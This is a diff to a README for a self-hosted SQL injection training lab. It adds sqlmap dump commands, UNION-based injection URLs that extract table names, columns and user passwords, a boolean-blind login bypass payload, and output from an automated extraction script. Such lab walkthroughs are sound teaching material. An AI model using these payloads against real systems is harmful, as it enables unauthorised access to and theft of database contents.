@@ -109,4 +109,77 @@ print('[+] password found : ',dump_data())
 ```
 ### 2.4. Tool sqlmap
 - install: `brew install sqlmap`
-- use: `sqlmap -r file_request --batch -D database --tables`
+- use: `sqlmap -u url_victim --batch --current-db` -> get name of database
+- use: `sqlmap -u url_victim --batch -D name_db --dump-all ` -> show all data of that database
+(`can use file_request to dynamic scan`)
+
+
+
+## 3. Step to step exploit this lab
+### Prepare to deploy lab
+|Command | Uses |
+|--------|------|
+|make build | build image before deploy lab|
+|make up | deploy lab|
+|make down | stop lab|
+|make logs | show logs|
+
+### 3.1. SQLi Union
+- click [me](http://0.0.0.0/sqliUnion.php) to redirect to this lab
+- in this lab
+![](https://raw.githubusercontent.com/magnetohvcs/payload/master/image/Screen%20Shot%202022-06-12%20at%2014.39.25.png)
+- enter any number to input
+![](https://raw.githubusercontent.com/magnetohvcs/payload/master/image/Screen%20Shot%202022-06-12%20at%2014.54.46.png)
+- modify url: `http://0.0.0.0/sqliUnion.php?id=1` to 
+`http://0.0.0.0/sqliUnion.php?id=0 union select 1,2,3,4,5,6` and we see it show 1,2,3,4,5,6
+![](https://raw.githubusercontent.com/magnetohvcs/payload/master/image/Screen%20Shot%202022-06-12%20at%2014.57.45.png)
+- now, we can use query show schema in order to get name of table and column
+```
+select group_concat(table_name) from information_schema.tables where table_schema=database()
+select group_concat(column_name) from information_schema.columns where table_name='table_name'
+```
+- -> `group_concat` function like `join` function in python, strings are concatenated by '`,`'
+- -> modify url as same as `http://0.0.0.0/sqliUnion.php?id=0 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()` to get name of tables
+- -> modify url as same as `http://0.0.0.0/sqliUnion.php?id=0 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='users'` to get name columns of that table, example table: `users`
+- -> modify url as same as `http://0.0.0.0/sqliUnion.php?id=0 union select 1,2,3,group_concat(username),group_concat(passwd),6 from users` to get data of table users
+
+### 3.2. SQLi Blind Boolean
+- clike [me](http://0.0.0.0/sqlBlind.html) to redirect this lab
+- enter username, password into input like image
+![](https://raw.githubusercontent.com/magnetohvcs/payload/master/image/Screen%20Shot%202022-06-12%20at%2015.38.55.png)
+- my mindset:
+- - use `-- -` to comment any query query, example:
+`select username, password from users where username='aa' or 1=1 -- -' and passowrd='a'`
+- - get each character in schema and equal it
+- - use python to exploit auto with mindset
+
+-  execute command: `python3 tool_exploit/solution.py`
+```
+admin@Admins-MacBook-Pro 002_sqlinjection % python3 tool_exploit/solution.py
+[+] table =  e
+[+] table =  em
+[+] table =  emp
+[+] table =  empl
+[+] table =  emplo
+[+] table =  employ
+[+] table =  employe
+[+] table =  employee
+[+] table =  employees
+[+] table =  employees,
+[+] table =  employees,j
+[+] table =  employees,jo
+[+] table =  employees,job
+[+] table =  employees,jobs
+[+] table =  employees,jobs,
+[+] table =  employees,jobs,u
+[+] table =  employees,jobs,us
+[+] table =  employees,jobs,use
+[+] table =  employees,jobs,user
+[+] table =  employees,jobs,users
+
+-----------
+[*] tables found:  employees,jobs,users
+[*] columns of employees found:  id,name,salary
+[*] columns of jobs found:  id,title,salary,location,type,date
+[*] columns of users found:  id,username,passwd,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+```
